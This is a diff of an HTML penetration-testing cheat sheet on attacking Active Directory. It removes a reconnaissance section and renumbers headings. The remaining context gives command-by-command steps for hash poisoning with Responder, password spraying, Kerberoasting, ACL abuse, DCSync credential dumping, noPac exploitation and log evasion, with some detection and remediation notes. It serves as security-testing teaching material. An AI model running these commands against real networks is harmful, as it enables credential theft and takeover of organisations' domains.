@@ -105,89 +105,11 @@
 
 <h2 id="ad-enum-attacks">1. Active Directory Enumeration and Exploitation</h2>
 
-<!-- ═══════════════════════════════════════════════════════════════ -->
-<h3 id="ad-overview">1.1 Active Directory Overview &amp; Engagement Setup</h3>
-
-<p>Active Directory (AD) is a directory service for Windows enterprise environments based on LDAP and X.500. It centralizes management of users, computers, groups, network devices, file shares, group policies, and trusts. AD provides <strong>authentication, accounting, and authorization</strong> within Windows networks. Microsoft AD holds roughly 43% of the market for enterprise IAM solutions.</p>
-
-<h4 id="engagement-setup">1.1.1 Engagement Setup &amp; Scope</h4>
-
-<p>Before testing, obtain a scoping document that defines target domains, subnets, and rules of engagement. Common internal assessment setups include:</p>
-
-<ul>
-  <li>Pentest VM in the client's internal network, tunneled back via VPN/SSH</li>
-  <li>Physical device plugged into an ethernet port</li>
-  <li>Physical presence with a laptop on-site</li>
-  <li>Cloud-hosted Linux VM (AWS/Azure) with internal access</li>
-  <li>VPN access into the internal network (limits some attacks like LLMNR poisoning)</li>
-  <li>Managed workstation or VDI (Citrix) with limited or full internet access</li>
-</ul>
-
-<table class="custom-table">
-<thead>  <tr><th>Data Point</th><th>Description</th></tr></thead>
-<tbody>
-  <tr><td>AD Users</td><td>Valid user accounts to target for password spraying</td></tr>
-  <tr><td>AD Joined Computers</td><td>DCs, file servers, SQL servers, web servers, Exchange, database servers</td></tr>
-  <tr><td>Key Services</td><td>Kerberos, NetBIOS, LDAP, DNS</td></tr>
-  <tr><td>Vulnerable Hosts/Services</td><td>Quick-win footholds: hosts or services that are easy to exploit</td></tr>
-</tbody>
-</table>
-
-<h3 id="external-recon">1.2 External Reconnaissance</h3>
-
-<p>External recon validates scope, identifies publicly accessible data, and builds target lists before any direct interaction with the target network.</p>
-
-<h4 id="external-recon-targets">1.2.1 Target Data</h4>
-
-<p>Job postings reveal technology stacks (e.g., SharePoint 2013/2016 versions). PDF metadata Author fields expose internal username formats. Breach databases confirm credential reuse. Combine these with tools like linkedin2username and statistically-likely-usernames lists for later password spraying.</p>
-
-<table class="custom-table">
-<thead>  <tr><th>Data Point</th><th>Description</th><th>Sources</th></tr></thead>
-<tbody>
-  <tr><td>IP Space / ASN</td><td>Netblocks, cloud hosting, DNS records</td><td>IANA, ARIN, RIPE, BGP Toolkit (bgp.he.net)</td></tr>
-  <tr><td>Domain Information</td><td>Subdomains, publicly exposed services, defense posture</td><td>Domaintools, viewdns.info, PTRArchive, ICANN</td></tr>
-  <tr><td>Schema/Username Format</td><td>Email naming conventions (first.last, flast, etc.), password policies</td><td>Company website, LinkedIn, job postings</td></tr>
-  <tr><td>Data Disclosures</td><td>PDF metadata (Author field reveals usernames), intranet links, share names</td><td>Google dorks (filetype:pdf, intext:"@domain")</td></tr>
-  <tr><td>Breach Data</td><td>Leaked usernames, passwords, hashes</td><td>HaveIBeenPwned, Dehashed</td></tr>
-</tbody>
-</table>
-
-<h4 id="external-recon-tools">1.2.2 Google Dorks</h4>
-
-<table class="custom-table">
-<thead>
-  <tr><th>Command</th><th>Description</th></tr>
-</thead>
-<tbody>
-  <tr><td><code>filetype:pdf inurl:domain.com</code></td><td>Exposed PDF documents</td></tr>
-  <tr><td><code>intext:"@domain.com" inurl:domain.com</code></td><td>Email addresses</td></tr>
-  <tr><td><code>filetype:xlsx OR filetype:csv inurl:domain.com</code></td><td>Spreadsheets with potential data</td></tr>
-  <tr><td><code>intitle:"index of" inurl:domain.com</code></td><td>Directory listings</td></tr>
-  <tr><td><code>filetype:xml inurl:domain.com</code></td><td>Configuration files</td></tr>
-  <tr><td><code>site:domain.com filetype:log</code></td><td>Exposed log files</td></tr>
-</tbody>
-</table>
-
-<h4>Methodology</h4>
-<ul class="methodology-checklist">
-<li><label><input type="checkbox"> Enumerate DNS records, subdomains, and MX records</label>
-<pre><code class="language-bash">dig any target.com
-host -t mx target.com
-dnsrecon -d target.com</code></pre></li>
-<li><label><input type="checkbox"> Validate IP space and ASN ownership via BGP Toolkit (bgp.he.net)</label>
-<pre><code class="language-bash">nslookup ns1.[domain-short].com</code></pre></li>
-<li><label><input type="checkbox"> LinkedIn/social media user enumeration for username list</label>
-<pre><code class="language-bash">linkedin2username -c "Company Name"</code></pre></li>
-<li><label><input type="checkbox"> Search for leaked credentials (Dehashed, IntelX)</label>
-<pre><code class="language-bash">sudo python3 dehashed.py -q [domain] -p</code></pre></li>
-<li><label><input type="checkbox"> Google dorks for exposed files and credentials</label></li>
-</ul>
-
-<h3 id="initial-enum">1.3 Initial Enumeration of the Domain</h3>
+<h3 id="initial-enum">1.1 Initial Enumeration of the Domain</h3>
 
 <p>Initial enumeration starts from an unauthenticated position on the internal network and focuses on hosts, services, users, and potential footholds.</p>
 
-<h4 id="passive-host-id">1.3.1 Passive Host Identification</h4>
+<h4 id="passive-host-id">1.1.1 Passive Host Identification</h4>
 
 <p>Passive listening reveals hosts via ARP requests/replies, MDNS broadcasts, and BROWSER protocol traffic without sending any packets.</p>
 
@@ -201,7 +123,7 @@ sudo tcpdump -i [interface]
 sudo responder -I [interface] -A</code></pre>
 
 
-<h4 id="active-host-id">1.3.2 Active Host Identification</h4>
+<h4 id="active-host-id">1.1.2 Active Host Identification</h4>
 
 <p>ICMP sweep to build a host list, then Nmap for service and version detection.</p>
 
@@ -223,7 +145,7 @@ sudo nmap -v -A -iL hosts.txt -oA host-enum</code></pre>
 </tbody>
 </table>
 
-<h4 id="user-enum-kerbrute">1.3.3 User Enumeration with Kerbrute</h4>
+<h4 id="user-enum-kerbrute">1.1.3 User Enumeration with Kerbrute</h4>
 
 <p>Kerbrute enumerates valid accounts via Kerberos pre-authentication. Pre-auth failures do not trigger event ID 4625, so this is stealthier than SMB-based enumeration.</p>
 
@@ -239,7 +161,7 @@ kerbrute userenum -d [domain] --dc [dc-ip] jsmith.txt -o [valid-users]</code></p
 
 <p>Use the <code>jsmith.txt</code> or <code>jsmith2.txt</code> wordlists from the statistically-likely-usernames repo. Generates event ID 4768 (TGT request) only if Kerberos logging is enabled.</p>
 
-<h4 id="system-access">1.3.4 Gaining a Foothold via SYSTEM Access</h4>
+<h4 id="system-access">1.1.4 Gaining a Foothold via SYSTEM Access</h4>
 
 <p>The NT AUTHORITY\SYSTEM account on a domain-joined host can impersonate the computer account, which functions as a domain user. Ways to obtain SYSTEM:</p>
 <ul>
@@ -272,11 +194,11 @@ crackmapexec smb DC_IP --users -u '' -p ''</code></pre></li>
 <pre><code class="language-bash">kerbrute userenum -d DOMAIN.LOCAL --dc DC_IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</code></pre></li>
 </ul>
 
-<h3 id="llmnr-poisoning">1.4 LLMNR/NBT-NS Poisoning</h3>
+<h3 id="llmnr-poisoning">1.2 LLMNR/NBT-NS Poisoning</h3>
 
 <p>LLMNR (UDP 5355) and NBT-NS (UDP 137) are fallback name resolution protocols that broadcast queries on the local network when DNS fails. An attacker on the same segment responds to these broadcasts, captures NTLMv2 hashes for offline cracking or relay.</p>
 
-<h4 id="llmnr-overview">1.4.1 Capture Workflow</h4>
+<h4 id="llmnr-overview">1.2.1 Capture Workflow</h4>
 
 <p>When DNS resolution fails, Windows broadcasts LLMNR and then NBT-NS to the local network. A responder such as Responder or Inveigh can answer first and capture the authentication attempt.</p>
 
@@ -290,7 +212,7 @@ crackmapexec smb DC_IP --users -u '' -p ''</code></pre></li>
 </ul>
 
 
-<h4 id="responder-linux">1.4.2 Responder (Linux)</h4>
+<h4 id="responder-linux">1.2.2 Responder (Linux)</h4>
 
 <p>NetNTLMv2 hashes are not pass-the-hash material. Crack them offline while Responder runs in a tmux window during other enumeration.</p>
 
@@ -301,7 +223,7 @@ hashcat -m 5600 [hash-file] /usr/share/wordlists/rockyou.txt</code></pre>
 <p>Logs are stored at <code>/usr/share/responder/logs/</code> in the format <code>(MODULE)-(HASH_TYPE)-(CLIENT_IP).txt</code>. Use <code>-w</code> for WPAD rogue proxy, <code>-A</code> for analyze-only mode (passive, no poisoning).</p>
 
 
-<h4 id="inveigh-windows">1.4.3 Inveigh (Windows)</h4>
+<h4 id="inveigh-windows">1.2.3 Inveigh (Windows)</h4>
 <p>Windows alternative to Responder. The C# version (InveighZero) provides a semi-interactive console for real-time hash review.</p>
 
 
@@ -328,7 +250,7 @@ Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></pre></li>
 </ul>
 
 
-<h4 id="llmnr-remediation">1.4.4 Remediation</h4>
+<h4 id="llmnr-remediation">1.2.4 Remediation</h4>
 
 
 <table class="custom-table">
@@ -344,11 +266,11 @@ Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></pre></li>
 
 <h4>Detection</h4>
 <p>Monitor UDP ports 5355 and 137. Watch event IDs 4697 and 7045. Inject LLMNR requests for non-existent hosts and alert on responses. Monitor registry key <code>HKLM\Software\Policies\Microsoft\Windows NT\DNSClient\EnableMulticast</code> for changes.</p>
-<h3 id="password-spraying">1.5 Password Spraying</h3>
+<h3 id="password-spraying">1.3 Password Spraying</h3>
 
 <p>Test a small set of common passwords against many accounts at once. Get the password policy first to stay under the lockout threshold.</p>
 
-<h4 id="password-policy">1.5.1 Enumerating the Password Policy</h4>
+<h4 id="password-policy">1.3.1 Enumerating the Password Policy</h4>
 
 <p>Always obtain the password policy before spraying to avoid account lockouts. Methods vary based on access level.</p>
 
@@ -384,7 +306,7 @@ Get-DomainPolicy</code></pre>
 </tbody>
 </table>
 
-<h4 id="building-user-lists">1.5.2 Building Target User Lists</h4>
+<h4 id="building-user-lists">1.3.2 Building Target User Lists</h4>
 
 <p>The <code>--users</code> flag in CrackMapExec shows <code>badpwdcount</code> per user. Filter out accounts with badpwdcount > 0 before spraying to avoid lockouts.</p>
 
@@ -404,7 +326,7 @@ kerbrute userenum -d [domain] --dc [dc-ip] /opt/jsmith.txt
 sudo crackmapexec smb [dc-ip] -u [user] -p [password] --users</code></pre>
 
 
-<h4 id="spraying-linux">1.5.3 Password Spraying from Linux</h4>
+<h4 id="spraying-linux">1.3.3 Password Spraying from Linux</h4>
 
 <p>Use <code>--local-auth</code> when spraying local admin hashes to prevent domain account lockouts.</p>
 
@@ -424,7 +346,7 @@ sudo crackmapexec smb [dc-ip] -u [user] -p [password]
 # Local admin password reuse
 sudo crackmapexec smb --local-auth [subnet] -u administrator -H [ntlm-hash] | grep +</code></pre>
 
-<h4 id="spraying-windows">1.5.4 Password Spraying from Windows</h4>
+<h4 id="spraying-windows">1.3.4 Password Spraying from Windows</h4>
 <p>DomainPasswordSpray auto-generates a user list from AD, queries the password policy, and removes users within 1 attempt of lockout.</p>
 
 
@@ -448,7 +370,7 @@ Invoke-DomainPasswordSpray -Password 'Season2024!' -OutFile spray_results.txt -E
 </ul>
 
 
-<h4 id="spraying-mitigation">1.5.5 Mitigation &amp; Detection</h4>
+<h4 id="spraying-mitigation">1.3.5 Mitigation &amp; Detection</h4>
 
 <table class="custom-table">
 <thead>  <tr><th>Mitigation</th><th>Details</th></tr></thead>
@@ -463,7 +385,7 @@ Invoke-DomainPasswordSpray -Password 'Season2024!' -OutFile spray_results.txt -E
 
 <h4>Detection</h4>
 <p>Monitor Event ID 4625 (logon failure) and 4771 (Kerberos pre-auth failed) for high-frequency patterns. Enable Kerberos logging via Group Policy.</p>
-<h3 id="security-controls">1.6 Enumerating Security Controls</h3>
+<h3 id="security-controls">1.4 Enumerating Security Controls</h3>
 
 <p>Check defensive controls before running tools, including AV products, AppLocker or WDAC policies, PowerShell language mode, and LAPS deployment.</p>
 
@@ -495,11 +417,11 @@ Get-LAPSComputers</code></pre>
 <pre><code class="language-powershell">Find-AdmPwdExtendedRights -Identity OUName</code></pre></li>
 </ul>
 
-<h3 id="cred-enum-linux">1.7 Credentialed Enumeration from Linux</h3>
+<h3 id="cred-enum-linux">1.5 Credentialed Enumeration from Linux</h3>
 
 <p>With valid domain credentials from a Linux attack host, enumerate AD remotely over SMB, LDAP, and RPC.</p>
 
-<h4 id="cme-enum">1.7.1 CrackMapExec</h4>
+<h4 id="cme-enum">1.5.1 CrackMapExec</h4>
 
 <pre><code class="language-bash"># Domain users with badpwdcount
 sudo crackmapexec smb [dc-ip] -u [user] -p [password] --users
@@ -516,7 +438,7 @@ sudo crackmapexec smb [dc-ip] -u [user] -p [password] --shares
 # Spider shares for files
 sudo crackmapexec smb [dc-ip] -u [user] -p [password] -M spider_plus --share '[share-name]'</code></pre>
 
-<h4 id="smbmap-enum">1.7.2 SMBMap</h4>
+<h4 id="smbmap-enum">1.5.2 SMBMap</h4>
 
 <pre><code class="language-bash"># Check share access
 smbmap -u [user] -p [password] -d [domain] -H [dc-ip]
@@ -524,7 +446,7 @@ smbmap -u [user] -p [password] -d [domain] -H [dc-ip]
 # Recursive directory listing
 smbmap -u [user] -p [password] -d [domain] -H [dc-ip] -R '[share-name]' --dir-only</code></pre>
 
-<h4 id="rpcclient-enum">1.7.3 rpcclient</h4>
+<h4 id="rpcclient-enum">1.5.3 rpcclient</h4>
 
 <p>The domain SID (e.g., S-1-5-21-3842939050-3880317879-2865463114) combined with a RID (e.g., 0x457 = 1111 decimal) creates a unique object SID. The built-in Administrator always has RID 500 (0x1f4).</p>
 
@@ -541,7 +463,7 @@ rpcclient $&gt; queryuser 0x457
 rpcclient $&gt; querydominfo</code></pre>
 
 
-<h4 id="impacket-enum">1.7.4 Impacket Toolkit</h4>
+<h4 id="impacket-enum">1.5.4 Impacket Toolkit</h4>
 <p>psexec.py uploads a service binary to ADMIN$ and runs it through SCM, which returns a SYSTEM shell. wmiexec.py executes through WMI as the authenticated user and generates fewer logs, but it spawns a new cmd.exe for each command (Event ID 4688).</p>
 
 
@@ -551,7 +473,7 @@ psexec.py [domain]/[user]:'[password]'@[target-ip]
 # WMI Exec -- semi-interactive shell as the authenticated user (stealthier)
 wmiexec.py [domain]/[user]:'[password]'@[dc-ip]</code></pre>
 
-<h4 id="windapsearch-enum">1.7.5 Windapsearch</h4>
+<h4 id="windapsearch-enum">1.5.5 Windapsearch</h4>
 
 <p>LDAP-based enumeration of domain users, groups, computers, and privileged accounts.</p>
 
@@ -565,7 +487,7 @@ python3 windapsearch.py --dc-ip [dc-ip] -u [user]@[domain] -p [password] --admin
 # Users with SPNs (Kerberoastable)
 python3 windapsearch.py --dc-ip [dc-ip] -u [user]@[domain] -p [password] --user-spns</code></pre>
 
-<h4 id="bloodhound-py">1.7.6 BloodHound.py</h4>
+<h4 id="bloodhound-py">1.5.6 BloodHound.py</h4>
 
 <pre><code class="language-bash">sudo bloodhound-python -u [user] -p [password] -ns [dc-ip] -d [domain] -c all</code></pre>
 
@@ -587,11 +509,11 @@ crackmapexec smb DC_IP -u user -p pass --loggedon-users</code></pre></li>
 <pre><code class="language-bash">python3 windapsearch.py -d DOMAIN.LOCAL --dc-ip DC_IP -u user@DOMAIN.LOCAL -p pass --da --privileged-users</code></pre></li>
 </ul>
 
-<h3 id="cred-enum-windows">1.8 Credentialed Enumeration from Windows</h3>
+<h3 id="cred-enum-windows">1.6 Credentialed Enumeration from Windows</h3>
 
 <p>From a domain-joined Windows host, PowerShell and .NET tools enumerate AD objects, ACLs, group memberships, and attack paths.</p>
 
-<h4 id="ad-powershell">1.8.1 ActiveDirectory PowerShell Module</h4>
+<h4 id="ad-powershell">1.6.1 ActiveDirectory PowerShell Module</h4>
 
 <pre><code class="language-powershell"># Load module
 Import-Module ActiveDirectory
@@ -613,7 +535,7 @@ Get-ADGroup -Identity "Backup Operators" -Properties *
 # Group membership
 Get-ADGroupMember -Identity "Domain Admins" -Recursive</code></pre>
 
-<h4 id="powerview">1.8.2 PowerView</h4>
+<h4 id="powerview">1.6.2 PowerView</h4>
 
 <pre><code class="language-powershell">Import-Module .\PowerView.ps1
 
@@ -632,14 +554,14 @@ Test-AdminAccess -ComputerName [target-host]
 # Find users with SPNs (Kerberoastable)
 Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></pre>
 
-<h4 id="snaffler">1.8.3 Snaffler (Credential Hunting in Shares)</h4>
+<h4 id="snaffler">1.6.3 Snaffler (Credential Hunting in Shares)</h4>
 
 <p>Snaffler searches accessible file shares for sensitive data: credentials, configuration files, private keys. Findings are classified by severity.</p>
 
 <pre><code class="language-bash"># Run against domain
 Snaffler.exe -s -d [domain] -o snaffler.log -v data</code></pre>
 
-<h4 id="sharphound">1.8.4 SharpHound / BloodHound</h4>
+<h4 id="sharphound">1.6.4 SharpHound / BloodHound</h4>
 
 <pre><code class="language-powershell"># Collect data
 .\SharpHound.exe -c All --zipfilename ILFREIGHT
@@ -666,11 +588,11 @@ Find-LocalAdminAccess</code></pre></li>
 <pre><code class="language-powershell">.\Snaffler.exe -s -o snaffler_output.txt</code></pre></li>
 </ul>
 
-<h3 id="living-off-land">1.9 Living Off the Land</h3>
+<h3 id="living-off-land">1.7 Living Off the Land</h3>
 
 <p>Built-in Windows commands for enumeration when third-party tools are unavailable or blocked.</p>
 
-<h4 id="lotl-basics">1.9.1 Basic Host &amp; Network Recon</h4>
+<h4 id="lotl-basics">1.7.1 Basic Host &amp; Network Recon</h4>
 
 <pre><code class="language-bash"># Host info
 hostname
@@ -686,7 +608,7 @@ route print
 # Logged-in users
 qwinsta</code></pre>
 
-<h4 id="lotl-powershell">1.9.2 PowerShell</h4>
+<h4 id="lotl-powershell">1.7.2 PowerShell</h4>
 
 <pre><code class="language-powershell"># Execution policy
 Get-ExecutionPolicy -List
@@ -703,7 +625,7 @@ netsh advfirewall show allprofiles
 # Downgrade to PowerShell v2 (bypasses some logging)
 powershell.exe -version 2</code></pre>
 
-<h4 id="lotl-wmi">1.9.3 WMI</h4>
+<h4 id="lotl-wmi">1.7.3 WMI</h4>
 
 <pre><code class="language-bash"># Patch level
 wmic qfe get Caption,Description,HotFixID,InstalledOn
@@ -714,7 +636,7 @@ wmic product get name
 # Running services
 wmic service list brief | findstr "Running"</code></pre>
 
-<h4 id="lotl-net">1.9.4 Net Commands</h4>
+<h4 id="lotl-net">1.7.4 Net Commands</h4>
 
 <table class="custom-table">
 <thead>  <tr><th>Command</th><th>Purpose</th></tr></thead>
@@ -734,7 +656,7 @@ wmic service list brief | findstr "Running"</code></pre>
 
 <p>If <code>net.exe</code> is blocked, try <code>net1.exe</code>: it is the actual binary that <code>net.exe</code> calls internally.</p>
 
-<h4 id="lotl-dsquery">1.9.5 Dsquery</h4>
+<h4 id="lotl-dsquery">1.7.5 Dsquery</h4>
 
 <pre><code class="language-bash"># All users
 dsquery user
@@ -780,15 +702,15 @@ wmic useraccount list /format:list</code></pre></li>
 nslookup -type=SRV _ldap._tcp.DOMAIN</code></pre></li>
 </ul>
 
-<h3 id="kerberoasting">1.10 Kerberoasting</h3>
+<h3 id="kerberoasting">1.8 Kerberoasting</h3>
 
 <p>Kerberoasting extracts TGS tickets encrypted with a service account's NTLM hash, then cracks them offline. Any authenticated domain user can request these tickets.</p>
 
-<h4 id="kerberoast-overview">1.10.1 Overview</h4>
+<h4 id="kerberoast-overview">1.8.1 Overview</h4>
 
 <p>Targets SPNs registered to domain user accounts (not machine accounts). The TGS ticket is encrypted with the service account's NTLM hash. Service accounts frequently have weak passwords and elevated privileges.</p>
 
-<h4 id="kerberoast-linux">1.10.2 Kerberoasting from Linux</h4>
+<h4 id="kerberoast-linux">1.8.2 Kerberoasting from Linux</h4>
 
 <pre><code class="language-bash"># List accounts with SPNs
 GetUserSPNs.py -dc-ip [dc-ip] [domain]/[user]
@@ -808,7 +730,7 @@ hashcat -m 13100 [tgs-file] /usr/share/wordlists/rockyou.txt
 # Validate cracked credentials
 sudo crackmapexec smb [dc-ip] -u [spn-user] -p [cracked-password]</code></pre>
 
-<h4 id="kerberoast-windows">1.10.3 Kerberoasting from Windows</h4>
+<h4 id="kerberoast-windows">1.8.3 Kerberoasting from Windows</h4>
 
 <pre><code class="language-powershell"># Semi-manual: enumerate SPNs
 setspn.exe -Q */*
@@ -829,7 +751,7 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\[outp
 base64 /out:true
 kerberos::list /export</code></pre>
 
-<h4 id="kerberoast-encryption">1.10.4 Encryption Type Considerations</h4>
+<h4 id="kerberoast-encryption">1.8.4 Encryption Type Considerations</h4>
 
 <p>Accounts with AES encryption enabled produce type 17/18 hashes (Hashcat mode 19700), which are significantly slower to crack. The <code>msDS-SupportedEncryptionTypes</code> attribute controls this:</p>
 
@@ -864,7 +786,7 @@ Get-DomainUser -SPN | select samaccountname,serviceprincipalname</code></pre></l
 </ul>
 
 
-<h4 id="kerberoast-defense">1.10.5 Mitigation &amp; Detection</h4>
+<h4 id="kerberoast-defense">1.8.5 Mitigation &amp; Detection</h4>
 
 <p>MITRE ATT&amp;CK: T1558.003; Steal or Forge Kerberos Tickets: Kerberoasting</p>
 
@@ -881,13 +803,13 @@ Get-DomainUser -SPN | select samaccountname,serviceprincipalname</code></pre></l
 
 <h4>Detection</h4>
 <p>Monitor Event ID 4769 (Kerberos Service Ticket Operations). Watch for RC4 TGS requests when accounts support AES. High volume of TGS requests from a single user is anomalous.</p>
-<h3 id="acl-abuse">1.11 ACL/ACE Abuse</h3>
+<h3 id="acl-abuse">1.9 ACL/ACE Abuse</h3>
 
 <p>AD objects are protected by DACLs composed of individual ACEs. Dangerous ACEs, such as GenericAll, WriteDACL, or ForceChangePassword granted to unprivileged groups, create attack paths that bypass traditional credential theft.</p>
 
 <figure><img src="./img/cape/bloodhound-forcechangepassword.png" alt="BloodHound showing ForceChangePassword edge between users"></figure>
 
-<h4 id="acl-overview">1.11.1 ACL Concepts</h4>
+<h4 id="acl-overview">1.9.1 ACL Concepts</h4>
 
 <p>Every AD object has a security descriptor containing:</p>
 <ul>
@@ -918,7 +840,7 @@ Get-DomainUser -SPN | select samaccountname,serviceprincipalname</code></pre></l
 </tbody>
 </table>
 
-<h4 id="acl-enumeration">1.11.2 ACL Enumeration</h4>
+<h4 id="acl-enumeration">1.9.2 ACL Enumeration</h4>
 
 <pre><code class="language-powershell"># PowerView: find interesting ACLs
 Find-InterestingDomainAcl
@@ -934,7 +856,7 @@ foreach($line in [System.IO.File]::ReadLines("C:\Users\[user]\Desktop\ad_users.t
 
 # BloodHound: use "Shortest Paths to Domain Admins" or "Find Dangerous Rights"</code></pre>
 
-<h4 id="acl-attack-chain">1.11.3 ACL Abuse Attack Chain Example</h4>
+<h4 id="acl-attack-chain">1.9.3 ACL Abuse Attack Chain Example</h4>
 
 <p>wley &rarr; ForceChangePassword on damundsen &rarr; GenericWrite on Help Desk Level 1 group &rarr; nested into Information Technology &rarr; GenericAll on adunn &rarr; DCSync</p>
 
@@ -959,7 +881,7 @@ Set-DomainObject -Credential $Cred2 -Identity [target-user] -SET @{serviceprinci
 
 # Step 6: Crack hash, use [target-user] for DCSync</code></pre>
 
-<h4 id="acl-cleanup">1.11.4 Cleanup</h4>
+<h4 id="acl-cleanup">1.9.4 Cleanup</h4>
 
 <pre><code class="language-powershell"># Remove fake SPN
 Set-DomainObject -Credential $Cred2 -Identity [target-user] -Clear serviceprincipalname -Verbose
@@ -989,7 +911,7 @@ Set-DomainUserPassword -Identity target -AccountPassword $cred</code></pre></li>
 </ul>
 
 
-<h4 id="acl-defense">1.11.5 Remediation &amp; Detection</h4>
+<h4 id="acl-defense">1.9.5 Remediation &amp; Detection</h4>
 
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Audit and remove dangerous ACLs, including GenericAll, WriteDACL, and WriteOwner on non-admin accounts</label></li>
@@ -998,14 +920,14 @@ Set-DomainUserPassword -Identity target -AccountPassword $cred</code></pre></li>
 <li><label><input type="checkbox"> Review SDDL strings with <code>ConvertFrom-SddlString</code> for human-readable ACL analysis</label></li>
 <li><label><input type="checkbox"> Run BloodHound "Dangerous Rights" queries periodically to catch new misconfigurations</label></li>
 </ul>
-<h3 id="dcsync">1.12 DCSync Attack</h3>
+<h3 id="dcsync">1.10 DCSync Attack</h3>
 
 <p>DCSync uses directory replication privileges to impersonate a DC and pull password hashes directly from AD, including the KRBTGT hash for Golden Tickets.</p>
 
 <figure><img src="./img/cape/dcsync-replication-rights.png" alt="ADSI Edit showing DCSync replication rights on a domain object"></figure>
 
 
-<h4 id="dcsync-overview">1.12.1 Replication Privileges</h4>
+<h4 id="dcsync-overview">1.10.1 Replication Privileges</h4>
 
 <p>An account with these replication rights can request NTDS.DIT data as if it were a DC:</p>
 
@@ -1017,7 +939,7 @@ Set-DomainUserPassword -Identity target -AccountPassword $cred</code></pre></li>
 
 <p>Domain Admins, Enterprise Admins, and the domain's Administrators group have these rights by default.</p>
 
-<h4 id="dcsync-linux">1.12.2 DCSync from Linux (secretsdump.py)</h4>
+<h4 id="dcsync-linux">1.10.2 DCSync from Linux (secretsdump.py)</h4>
 
 <pre><code class="language-bash"># Full dump
 secretsdump.py -outputfile [domain-short]_hashes -just-dc [DOMAIN]/[user]@[dc-ip]
@@ -1034,7 +956,7 @@ secretsdump.py -just-dc-user [DOMAIN]/administrator [DOMAIN]/[user]@[dc-ip]</cod
 Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}</code></pre>
 
-<h4 id="dcsync-windows">1.12.3 DCSync from Windows (Mimikatz)</h4>
+<h4 id="dcsync-windows">1.10.3 DCSync from Windows (Mimikatz)</h4>
 
 
 <pre><code class="language-powershell"># Verify replication rights
@@ -1063,7 +985,7 @@ impacket-psexec -hashes :NTLM_HASH administrator@DC_IP</code></pre></li>
 </ul>
 
 
-<h4 id="dcsync-defense">1.12.4 Remediation</h4>
+<h4 id="dcsync-defense">1.10.4 Remediation</h4>
 
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Restrict replication rights to Domain Controllers and necessary service accounts only</label></li>
@@ -1071,11 +993,11 @@ impacket-psexec -hashes :NTLM_HASH administrator@DC_IP</code></pre></li>
 <li><label><input type="checkbox"> Monitor event ID 4624 for logon events where a non-DC source performs replication</label></li>
 <li><label><input type="checkbox"> Alert on DRSUAPI::DsGetNCChanges requests originating from workstations (secretsdump/Mimikatz signature)</label></li>
 </ul>
-<h3 id="privileged-access">1.13 Privileged Access</h3>
+<h3 id="privileged-access">1.11 Privileged Access</h3>
 
 <p>Test obtained credentials against remote access services. RDP, WinRM, and SQL Server each require different group memberships.</p>
 
-<h4 id="rdp-access">1.13.1 Remote Desktop (RDP)</h4>
+<h4 id="rdp-access">1.11.1 Remote Desktop (RDP)</h4>
 
 <pre><code class="language-bash"># Enumerate Remote Desktop Users group
 Get-ADGroupMember -Identity "Remote Desktop Users"
@@ -1083,7 +1005,7 @@ Get-ADGroupMember -Identity "Remote Desktop Users"
 # BloodHound: CanRDP edge
 # Cypher: MATCH p=(u)-[:CanRDP]-&gt;(c) RETURN p</code></pre>
 
-<h4 id="winrm-access">1.13.2 WinRM</h4>
+<h4 id="winrm-access">1.11.2 WinRM</h4>
 
 <pre><code class="language-powershell"># Enumerate Remote Management Users
 Get-ADGroupMember -Identity "Remote Management Users"
@@ -1099,7 +1021,7 @@ Enter-PSSession -ComputerName [target-host] -Credential $cred
 # Connect from Linux
 evil-winrm -i [target-ip] -u [user] -p [password]</code></pre>
 
-<h4 id="sql-admin">1.13.3 SQL Server Admin</h4>
+<h4 id="sql-admin">1.11.3 SQL Server Admin</h4>
 
 <pre><code class="language-powershell"># BloodHound: SQLAdmin edge
 # PowerUpSQL enumeration
@@ -1128,11 +1050,11 @@ Get-ADGroupMember "Remote Management Users"</code></pre></li>
 <pre><code class="language-bash">crackmapexec mssql TARGETS -u user -p pass</code></pre></li>
 </ul>
 
-<h3 id="double-hop">1.14 Kerberos Double Hop Problem</h3>
+<h3 id="double-hop">1.12 Kerberos Double Hop Problem</h3>
 
 <p>When connecting to a remote host via WinRM/PSRemoting, your TGT is not forwarded. The remote session has a TGS for that host only, so it cannot authenticate to a third host on your behalf. This is the "double hop" problem.</p>
 
-<h4 id="double-hop-workarounds">1.14.1 Workarounds</h4>
+<h4 id="double-hop-workarounds">1.12.1 Workarounds</h4>
 
 <p>Both workarounds place credentials on the remote host. Workaround 2 spawns the session as the registered user regardless of who connects, so restrict access carefully.</p>
 
@@ -1149,11 +1071,11 @@ Enter-PSSession -ComputerName [target-host] -Credential $Cred -ConfigurationName
 
 <!-- ═══════════════════════════════════════════════════════════════ -->
 
-<h3 id="bleeding-edge">1.15 Bleeding Edge Vulnerabilities</h3>
+<h3 id="bleeding-edge">1.13 Bleeding Edge Vulnerabilities</h3>
 
 <p>High-impact AD vulnerabilities (2020-2022) that provide direct domain escalation. Verify the target's patch level before attempting.</p>
 
-<h4 id="nopac">1.15.1 NoPac / SamAccountName Spoofing</h4>
+<h4 id="nopac">1.13.1 NoPac / SamAccountName Spoofing</h4>
 
 <p>This chain combines CVE-2021-42278 (SamAccountName spoofing) with CVE-2021-42287 (KDC confusion during TGS request), allowing a standard domain user to impersonate a DC and obtain a TGT as that DC.</p>
 
@@ -1169,7 +1091,7 @@ sudo python3 noPac.py [domain]/[user]:[password] -dc-ip [dc-ip] -dc-host [dc-hos
 sudo python3 noPac.py [domain]/[user]:[password] -dc-ip [dc-ip] -dc-host [dc-hostname] --impersonate administrator -use-ldap -dump -just-dc-user [DOMAIN]/administrator</code></pre>
 
 
-<h4 id="printnightmare">1.15.2 PrintNightmare (CVE-2021-34527 / CVE-2021-1675)</h4>
+<h4 id="printnightmare">1.13.2 PrintNightmare (CVE-2021-34527 / CVE-2021-1675)</h4>
 
 <p>Remote code execution via the Windows Print Spooler service. Allows loading a malicious DLL from a remote share.</p>
 
